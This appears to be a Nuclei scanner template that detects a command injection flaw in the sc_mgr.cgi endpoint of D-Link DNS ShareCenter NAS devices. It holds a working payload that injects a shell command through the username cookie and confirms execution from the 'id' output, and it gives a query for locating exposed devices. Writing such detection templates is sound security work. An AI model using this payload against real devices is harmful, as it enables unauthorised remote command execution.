id: d-link-nas-sc-mgr-rce
info:
  name: D-Link DNS ShareCenter - Command Injection and Backdoor Account
  author: qwtd
  severity: critical
  reference:
    - https://wiki.wy876.cn/#/./D-Link/D-Link-NAS%E6%8E%A5%E5%8F%A3sc_mgr.cgi%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E
  metadata:
    verified: true
    vendor: dlink
    product: "dns-320l_firmware"
    fofa-query: "app=\"D_Link-DNS-ShareCenter\""
    max-request: 1
  tags: D-Link-DNS

http:
  - raw:
      - |
        GET /cgi-bin/sc_mgr.cgi?cmd=SC_Get_Info HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
        Accept: */*
        Accept-Encoding: gzip, deflate
        Connection: close
        Cookie: username=mopfdfsewo'& id & echo 'mopfdfsewo;

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)"

      - type: status
        status:
          - 200
# digest: 490a0046304402203982bd27134560aeb8fa52d09e98ad42fbbbcaf319d257593aed74bef082be5a02202be13f559cdcb1d20876067e3f5b91f3264f7c62311e31c8907fbeac7990117e:922c64590222798bb761d5b6d8e72950